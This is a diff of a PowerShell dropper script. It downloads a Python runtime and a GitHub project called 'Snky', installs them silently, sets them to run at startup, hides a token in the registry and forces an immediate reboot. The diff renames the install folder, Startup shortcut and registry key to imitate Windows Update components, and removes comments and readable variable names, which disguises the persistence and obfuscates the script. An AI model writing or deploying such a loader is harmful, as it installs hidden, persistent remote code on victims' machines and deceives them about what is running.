@@ -1,39 +1,33 @@
-$projectUrl = "https://github.com/richa-z/Snky/archive/refs/heads/main.zip"
-$pythonUrl = "https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe"
-$pythonInstaller = "$($env:TEMP)\python.exe"
-$reg_path = "HKCU:\Software\WindowsUpdates"
-$property_name = "a"
-$property_value = "GZipped, Base 64 Encoded token here"
+$prjRl = "https://github.com/richa-z/Snky/archive/refs/heads/main.zip"
+$ptnRl = "https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe"
+$ptnIn = "$($env:TEMP)\python.exe"
+$rp = "HKCU:\Software\WindowsUpdates"
+$pn = "a"
+$pp = "GZipped, Base 64 Encoded token here"
 
-#PYTHON INSTALLER
-Invoke-WebRequest -Uri $pythonUrl -OutFile $pythonInstaller
+Invoke-WebRequest -Uri $ptnRl -OutFile $ptnIn
 
-#PYTHON INSTALLATION
-Start-Process -FilePath $pythonInstaller -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0" -Wait
-$pythonPath = Join-Path $env:ProgramFiles "Python310"
-[System.Environment]::SetEnvironmentVariable("Path", "$($env:Path);$pythonPath","User")
+Start-Process -FilePath $ptnIn -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0" -Wait
+$pyp = Join-Path $env:ProgramFiles "Python310"
+[System.Environment]::SetEnvironmentVariable("Path", "$($env:Path);$pyp","User")
 
-Invoke-WebRequest -Uri $projectUrl -OutFile "$($env:TEMP)\Snky.zip"
-Expand-Archive -Path "$($env:TEMP)\Snky.zip" -DestinationPath "$($env:LOCALAPPDATA)\Snky" -Force
+Invoke-WebRequest -Uri $prjRl -OutFile "$($env:TEMP)\program.zip"
+Expand-Archive -Path "$($env:TEMP)\program.zip" -DestinationPath "$($env:LOCALAPPDATA)\WindowsUpdatesManager" -Force
 cmd.exe /c python -m pip install --upgrade pip
-cmd.exe /c pip install -r "$($env:LOCALAPPDATA)\Snky\Snky-main\requirements.txt"
+cmd.exe /c pip install -r "$($env:LOCALAPPDATA)\WindowsUpdatesManager\Snky-main\requirements.txt"
 
-#SCUT
 $WshShell = New-Object -comObject WScript.Shell
-$Shortcut = $WshShell.CreateShortcut("$($env:APPDATA)\Microsoft\Windows\Start Menu\Programs\Startup\Snky.lnk")
-$Shortcut.TargetPath = "$($env:LOCALAPPDATA)\Snky\Snky-main\main.pyw"
+$Shortcut = $WshShell.CreateShortcut("$($env:APPDATA)\Microsoft\Windows\Start Menu\Programs\Startup\WinUpdateCheck.lnk")
+$Shortcut.TargetPath = "$($env:LOCALAPPDATA)\WindowsUpdatesManager\Snky-main\main.pyw"
 $Shortcut.Save()
 
-#REGISTRY
-if (!(Test-Path $reg_path)) {
-    New-Item -Path $reg_path -Force | Out-Null
+if (!(Test-Path $rp)) {
+    New-Item -Path $rp -Force | Out-Null
 }
 
-New-Item -Path $reg_path
+New-Item -Path $rp
 
-New-ItemProperty -Path $reg_path -Name $property_name -Value $property_value -PropertyType String -Force | Out-Null
-
-#Start-Process "$($env:LOCALAPPDATA)\Snky\Snky-main\main.pyw" $token -Wait -WindowStyle Hidden
+New-ItemProperty -Path $rp -Name $pn -Value $pp -PropertyType String -Force | Out-Null
 
 cmd.exe /c shutdown /r /t 0
 
